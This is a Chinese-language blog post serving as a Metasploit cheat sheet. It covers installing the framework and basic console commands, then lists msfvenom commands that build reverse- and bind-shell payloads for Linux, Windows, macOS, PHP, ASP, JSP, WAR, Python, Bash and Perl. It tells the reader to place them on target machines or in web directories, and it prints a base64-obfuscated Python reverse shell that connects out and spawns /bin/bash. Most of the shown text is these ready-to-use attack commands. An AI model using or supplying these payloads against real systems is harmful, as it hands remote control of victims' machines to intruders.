<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="MSF备忘录"><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>MSF备忘录 | cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85%E8%BF%90%E8%A1%8C%E5%8F%8A%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">1. 安装运行及初始化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-msf%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">2. msf基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-msfvenom%E7%94%9F%E6%88%90payload"><span class="toc-number">3.</span> <span class="toc-text">3 msfvenom生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">4. Meterpreter基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 基本系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%8F%90%E6%9D%83"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C"><span class="toc-number">4.7.</span> <span class="toc-text">4.7 假冒令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-number">4.8.</span> <span class="toc-text">4.8 植入后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-msf%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-1"><span class="toc-number">6.</span> <span class="toc-text">2. msf基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-msfvenom%E7%94%9F%E6%88%90payload-1"><span class="toc-number">7.</span> <span class="toc-text">3 msfvenom生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-1"><span class="toc-number">8.</span> <span class="toc-text">4. Meterpreter基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-1"><span class="toc-number">8.1.</span> <span class="toc-text">4.1 基本系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-1"><span class="toc-number">8.2.</span> <span class="toc-text">4.2 文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4-1"><span class="toc-number">8.3.</span> <span class="toc-text">4.3 网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">8.4.</span> <span class="toc-text">4.4 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%8F%90%E6%9D%83-1"><span class="toc-number">8.5.</span> <span class="toc-text">4.5 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81-1"><span class="toc-number">8.6.</span> <span class="toc-text">4.6 获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C-1"><span class="toc-number">8.7.</span> <span class="toc-text">4.7 假冒令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8-1"><span class="toc-number">8.8.</span> <span class="toc-text">4.8 植入后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-msf%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-2"><span class="toc-number">10.</span> <span class="toc-text">2. msf基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-msfvenom%E7%94%9F%E6%88%90payload-2"><span class="toc-number">11.</span> <span class="toc-text">3 msfvenom生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-2"><span class="toc-number">12.</span> <span class="toc-text">4. Meterpreter基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-2"><span class="toc-number">12.1.</span> <span class="toc-text">4.1 基本系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-2"><span class="toc-number">12.2.</span> <span class="toc-text">4.2 文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4-2"><span class="toc-number">12.3.</span> <span class="toc-text">4.3 网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">12.4.</span> <span class="toc-text">4.4 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%8F%90%E6%9D%83-2"><span class="toc-number">12.5.</span> <span class="toc-text">4.5 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81-2"><span class="toc-number">12.6.</span> <span class="toc-text">4.6 获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C-2"><span class="toc-number">12.7.</span> <span class="toc-text">4.7 假冒令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8-2"><span class="toc-number">12.8.</span> <span class="toc-text">4.8 植入后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-2"><span class="toc-number">13.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-msf%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-3"><span class="toc-number">14.</span> <span class="toc-text">2. msf基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-msfvenom%E7%94%9F%E6%88%90payload-3"><span class="toc-number">15.</span> <span class="toc-text">3 msfvenom生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-3"><span class="toc-number">16.</span> <span class="toc-text">4. Meterpreter基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-3"><span class="toc-number">16.1.</span> <span class="toc-text">4.1 基本系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-3"><span class="toc-number">16.2.</span> <span class="toc-text">4.2 文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4-3"><span class="toc-number">16.3.</span> <span class="toc-text">4.3 网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="toc-number">16.4.</span> <span class="toc-text">4.4 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%8F%90%E6%9D%83-3"><span class="toc-number">16.5.</span> <span class="toc-text">4.5 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81-3"><span class="toc-number">16.6.</span> <span class="toc-text">4.6 获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C-3"><span class="toc-number">16.7.</span> <span class="toc-text">4.7 假冒令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8-3"><span class="toc-number">16.8.</span> <span class="toc-text">4.8 植入后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-3"><span class="toc-number">17.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-msf%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-4"><span class="toc-number">18.</span> <span class="toc-text">2. msf基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-msfvenom%E7%94%9F%E6%88%90payload-4"><span class="toc-number">19.</span> <span class="toc-text">3 msfvenom生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-4"><span class="toc-number">20.</span> <span class="toc-text">4. Meterpreter基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-4"><span class="toc-number">20.1.</span> <span class="toc-text">4.1 基本系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-4"><span class="toc-number">20.2.</span> <span class="toc-text">4.2 文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4-4"><span class="toc-number">20.3.</span> <span class="toc-text">4.3 网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-4"><span class="toc-number">20.4.</span> <span class="toc-text">4.4 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%8F%90%E6%9D%83-4"><span class="toc-number">20.5.</span> <span class="toc-text">4.5 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81-4"><span class="toc-number">20.6.</span> <span class="toc-text">4.6 获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C-4"><span class="toc-number">20.7.</span> <span class="toc-text">4.7 假冒令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8-4"><span class="toc-number">20.8.</span> <span class="toc-text">4.8 植入后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-4"><span class="toc-number">21.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-msf%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-5"><span class="toc-number">22.</span> <span class="toc-text">2. msf基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-msfvenom%E7%94%9F%E6%88%90payload-5"><span class="toc-number">23.</span> <span class="toc-text">3 msfvenom生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-5"><span class="toc-number">24.</span> <span class="toc-text">4. Meterpreter基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-5"><span class="toc-number">24.1.</span> <span class="toc-text">4.1 基本系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4-5"><span class="toc-number">24.2.</span> <span class="toc-text">4.2 文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4-5"><span class="toc-number">24.3.</span> <span class="toc-text">4.3 网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-5"><span class="toc-number">24.4.</span> <span class="toc-text">4.4 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%8F%90%E6%9D%83-5"><span class="toc-number">24.5.</span> <span class="toc-text">4.5 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81-5"><span class="toc-number">24.6.</span> <span class="toc-text">4.6 获取凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C-5"><span class="toc-number">24.7.</span> <span class="toc-text">4.7 假冒令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8-5"><span class="toc-number">24.8.</span> <span class="toc-text">4.8 植入后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-5"><span class="toc-number">25.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">41</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">MSF备忘录</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-05</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="1-安装运行及初始化"><a href="#1-安装运行及初始化" class="headerlink" title="1. 安装运行及初始化"></a>1. 安装运行及初始化</h2><p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令"><a href="#2-msf基本命令" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload"><a href="#3-msfvenom生成payload" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

<p>1.可执行程序</p>
<p>Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>Windows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>Mac</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<p>执行方式：直接复制可执行程序到目标机器上执行就行了。</p>
<p>2.Web Payloads</p>
<p>PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<p>ASP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<p>JSP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<p>WAR</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

<p>3.脚本shell</p>
<p>Python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<p>Bash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>执行方式：复制shell.py中的内容在linux命令行下执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>4.shellcode<br>Linux Based Shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

